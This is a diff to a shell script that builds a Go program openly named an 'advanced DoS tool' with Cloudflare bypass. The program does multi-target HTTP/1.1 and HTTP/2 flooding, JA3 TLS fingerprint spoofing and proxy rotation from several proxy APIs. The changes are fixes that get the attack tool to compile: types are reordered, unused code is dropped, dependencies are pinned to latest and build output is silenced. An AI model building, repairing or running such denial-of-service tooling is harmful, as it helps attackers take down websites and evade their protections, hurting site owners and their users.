@@ -3,7 +3,7 @@
 # ----------------------------------------
 # ADVANCED GO DOS TOOL - CLOUDFLARE BYPASS PRO
 # MULTI-TARGET + HTTP/2 + HTTP/1.1 + Advanced Spoofing
-# WITH 6 PROXY API SOURCES
+# WITH 6 PROXY API SOURCES - FIXED VERSION
 # ----------------------------------------
 
 # Color definitions
@@ -38,7 +38,6 @@ import (
 	"bufio"
 	"crypto/rand"
 	"crypto/tls"
-	"encoding/json"
 	"fmt"
 	"io"
 	"math/big"
@@ -251,6 +250,18 @@ var ja3Signatures = []JA3Signature{
 	},
 }
 
+type AtomicCounter struct {
+	val int64
+}
+
+func (c *AtomicCounter) inc() {
+	atomic.AddInt64(&c.val, 1)
+}
+
+func (c *AtomicCounter) get() int64 {
+	return atomic.LoadInt64(&c.val)
+}
+
 type ConnectionPool struct {
 	clients    []*http.Client
 	counter    uint64
@@ -264,22 +275,17 @@ type Target struct {
 	URL       string
 	Mode      string
 	Duration  time.Duration
-	Stats     *atomicCounter
+	Stats     *AtomicCounter
 	Done      chan struct{}
 	Pool      *ConnectionPool
 	UseProxy  bool
 }
 
-type AtomicCounter struct {
-	val int64
-}
-
-func (c *AtomicCounter) inc() {
-	atomic.AddInt64(&c.val, 1)
-}
-
-func (c *AtomicCounter) get() int64 {
-	return atomic.LoadInt64(&c.val)
+type TargetConfig struct {
+	URL      string
+	Mode     string
+	Duration string
+	UseProxy bool
 }
 
 func getRandomJA3Signature() JA3Signature {
@@ -431,13 +437,6 @@ func loadProxiesFromAPI() {
 	} else {
 		fmt.Printf("[Proxy] Warning: No proxies loaded from any API\n")
 	}
-}
-
-// Rotate to next proxy API for next refresh
-func getNextProxyAPI() int {
-	current := currentProxyAPI
-	currentProxyAPI = (currentProxyAPI + 1) % len(proxyAPIs)
-	return current
 }
 
 func proxyRefresher() {
@@ -670,6 +669,8 @@ func attackTarget(target Target, workerID int, wg *sync.WaitGroup) {
 				}
 			} else if target.Mode == "HEAD" {
 				req, err = http.NewRequest("HEAD", fullURL, nil)
+			} else {
+				continue
 			}
 
 			if err != nil {
@@ -742,13 +743,6 @@ func loadTargetsFromFile(filename string) ([]TargetConfig, error) {
 	}
 	
 	return targets, scanner.Err()
-}
-
-type TargetConfig struct {
-	URL      string
-	Mode     string
-	Duration string
-	UseProxy bool
 }
 
 func printBanner() {
@@ -1048,15 +1042,15 @@ echo
 
 # Download dependencies
 echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
-go get -u golang.org/x/net@v0.24.0
-go get -u golang.org/x/text@v0.14.0
-go get -u golang.org/x/crypto@v0.22.0
+go get -u golang.org/x/net@latest
+go get -u golang.org/x/text@latest
+go get -u golang.org/x/crypto@latest
 echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
 echo
 
 # Tidy up and verify
 echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
-go mod tidy
+go mod tidy > /dev/null 2>&1
 echo -e " ${GREEN}✓ Tidy complete${NC}"
 echo
 
@@ -1067,13 +1061,13 @@ echo
 
 # Download missing dependencies explicitly
 echo -e " ${YELLOW}➤${NC} ${GREEN}Ensuring all dependencies are downloaded...${NC}"
-go mod download
+go mod download > /dev/null 2>&1
 echo -e " ${GREEN}✓ Dependencies verified${NC}"
 echo
 
 # Compile
 echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
-go build -v -o main main.go
+go build -v -o main main.go 2>&1
 
 if [ $? -eq 0 ]; then
     chmod +x main
@@ -1152,18 +1146,15 @@ else
     echo
     echo -e " ${YELLOW}➤${NC} ${YELLOW}Diagnostic information:${NC}"
     echo -e "   Go version: $(go version)"
-    echo -e "   Module file contents:"
-    cat go.mod 2>/dev/null || echo "   No go.mod file"
     echo
     echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
     echo
     echo -e "   ${BLUE}1.${NC} go mod init main"
-    echo -e "   ${BLUE}2.${NC} go get -u golang.org/x/net@v0.24.0"
-    echo -e "   ${BLUE}3.${NC} go get -u golang.org/x/text@v0.14.0"
-    echo -e "   ${BLUE}4.${NC} go get -u golang.org/x/crypto@v0.22.0"
+    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@latest"
+    echo -e "   ${BLUE}3.${NC} go get golang.org/x/text@latest"
+    echo -e "   ${BLUE}4.${NC} go get golang.org/x/crypto@latest"
     echo -e "   ${BLUE}5.${NC} go mod tidy"
-    echo -e "   ${BLUE}6.${NC} go mod download"
-    echo -e "   ${BLUE}7.${NC} go build -v -o main main.go"
+    echo -e "   ${BLUE}6.${NC} go build -v -o main main.go"
     echo
     rm -f main.go
     exit 1
